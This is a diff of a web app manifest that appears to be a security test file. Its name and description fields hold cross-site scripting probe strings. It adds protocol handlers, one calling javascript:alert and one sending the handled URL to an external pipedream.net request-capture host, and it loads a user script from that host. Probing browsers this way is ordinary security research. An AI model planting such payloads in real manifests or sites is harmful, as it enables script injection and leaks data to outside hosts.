@@ -1,7 +1,7 @@
 {"name":"Gittest<b>test1'test2\"test3</script><img/src/onerror=alert()//>",
 "short_name":"Gittest<b>test1'test2\"test3</script><img/src/onerror=alert()//>",
 "description":"test<b>test1'test2\"test3</script><img/src/onerror=alert()//>",
-"start_url":"javascript://localhost/%0aalert('starturl')//",
+"start_url":"test/",
 "id":"test<b>test1'test2\"test3</script><img/src/onerror=alert()//>",
 "display":"standalone",
 "icons":[{"sizes":"114x114","src":"http://localhost/?https://github.githubassets.com/assets/apple-touch-icon-114x114-09ce42d3ca4b.png"},
@@ -49,5 +49,14 @@
 },
   "user_scripts": {
     "api_script": "https://323bb6f517f98871600487209103cd74.m.pipedream.net/apiscript.js"
-  }
+  },"protocol_handlers": [
+    {
+      "protocol": "test",
+      "url": "https://323bb6f517f98871600487209103cd74.m.pipedream.net/tea?type=%s"
+    },
+    {
+      "protocol": "https",
+      "url": "javascript:alert('%s')"
+    }
+  ]
 }
